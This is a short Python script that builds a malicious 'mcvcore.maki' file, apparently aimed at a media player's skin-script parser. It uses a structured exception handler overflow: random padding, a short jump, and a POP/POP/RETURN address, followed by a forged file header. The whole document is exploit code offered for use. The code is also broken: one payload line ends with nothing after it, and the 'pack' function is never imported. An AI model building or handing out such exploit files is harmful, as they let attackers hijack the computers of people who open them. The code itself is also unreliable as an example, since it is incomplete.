from os import urandom

# Open new MAKI file for exploit
with open('mcvcore.maki', 'w') as file:

	punch  = urandom(16756)			# Random bytes
	punch += '\xEB\x04\x90\x90'		# JUMP + 4
	punch += '\xC3\x2B\xF0\x12'		# POP/POP/RETURN
	punch +=

	headr  = '\x46\x47'				# Magic
	headr += '\x03\x04'				# Version
	headr += '\x17\x00\x00\x00'

	types  = '\x01\x00\x00\x00'		# Count
	types += '\x71\x49\x65\x51'		# Types
	types += '\x87\x0D\x51\x4A'
	types += '\x91\xE3\xA6\xB5'
	types += '\x32\x35\xF3\xE7'

	funct  = '\x01\x00\x00\x00'		# Count
	funct += '\x01\x01'				# Class
	funct += '\x00\x00'				# Dummy
	funct += pack('<I', len(punch))	# Little-Endian UINT

	final  = headr 
	final += types
	final += funct
	final += punch

	print(final)					# Debug

	file.write(final)

if file.closed:
	print("Exploit generated successfully.")
else:
	print("Something went wrong.")
